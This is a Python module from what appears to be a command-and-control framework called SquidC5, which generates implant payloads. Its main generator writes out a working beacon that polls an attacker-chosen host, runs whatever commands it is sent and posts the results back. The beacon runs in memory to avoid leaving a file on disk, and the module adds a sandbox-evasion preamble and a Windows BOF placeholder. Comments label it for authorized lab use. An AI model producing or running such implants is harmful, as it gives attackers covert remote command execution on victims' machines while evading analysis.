"""Generate runnable implant stubs for advanced families (authorized lab)."""

from __future__ import annotations

from typing import Any


def generate_memory_beacon_python(host: str, port: int, path: str = "/api/v1/implant/beacon") -> str:
    """In-memory style Python beacon (still process-resident; lab only)."""
    return f'''#!/usr/bin/env python3
# SquidC5 memory_beacon_python — authorized testing only
# Loads beacon loop without writing a persistent on-disk implant file.
import json, time, urllib.request, socket, types
def _run():
    C2 = "http://{host}:{port}{path}"
    SID = None
    while True:
        try:
            req = urllib.request.Request(
                C2,
                data=json.dumps({{"session_id": SID, "hostname": socket.gethostname()}}).encode(),
                headers={{"Content-Type": "application/json"}},
            )
            with urllib.request.urlopen(req, timeout=30) as r:
                data = json.loads(r.read().decode())
                SID = data.get("session_id", SID)
                task = data.get("task")
                if task:
                    import subprocess
                    out = subprocess.getoutput(task.get("command", "id"))
                    done = urllib.request.Request(
                        C2 + "/result",
                        data=json.dumps({{"task_id": task["id"], "result": out}}).encode(),
                        headers={{"Content-Type": "application/json"}},
                    )
                    urllib.request.urlopen(done, timeout=30).read()
        except Exception:
            pass
        time.sleep(5)
# Execute from loader without tempfile
types.FunctionType(_run.__code__, globals())()
'''


def generate_with_evasion(
    base_script: str,
    platform: str = "linux",
    *,
    include_sandbox_probe: bool = True,
) -> str:
    from squidc5.evasion.checks import sandbox_probe_snippet

    parts = ["# evasion preamble (lab)", ""]
    if include_sandbox_probe:
        parts.append(sandbox_probe_snippet(platform))
        parts.append("")
    parts.append(base_script)
    return "\n".join(parts)


def generate_implant(
    family: str,
    platform: str,
    arch: str,
    host: str,
    port: int,
    path: str = "/api/v1/implant/beacon",
    *,
    evasion: bool = True,
) -> dict[str, Any]:
    if family == "memory_beacon_python":
        if platform not in ("linux", "macos"):
            raise ValueError("memory_beacon_python supports linux/macos only")
        content = generate_memory_beacon_python(host, port, path)
        if evasion:
            content = generate_with_evasion(content, platform)
        return {"family": family, "platform": platform, "arch": arch, "content": content}
    if family == "http_beacon":
        # thin wrapper — prefer PayloadGenerator for full profiles
        content = generate_memory_beacon_python(host, port, path)
        if evasion:
            content = generate_with_evasion(content, platform)
        return {"family": family, "platform": platform, "arch": arch, "content": content}
    if family == "bof_stub":
        if platform != "windows":
            raise ValueError("bof_stub is windows-only")
        content = (
            "; SquidC5 BOF-like stub (operator supplies COFF object)\n"
            f"; callback host={host} port={port} arch={arch}\n"
            "; Link against your BOF toolchain — this is a placeholder entry, not a full BOF.\n"
        )
        return {"family": family, "platform": platform, "arch": arch, "content": content}
    raise ValueError(f"No generator for family: {family}")
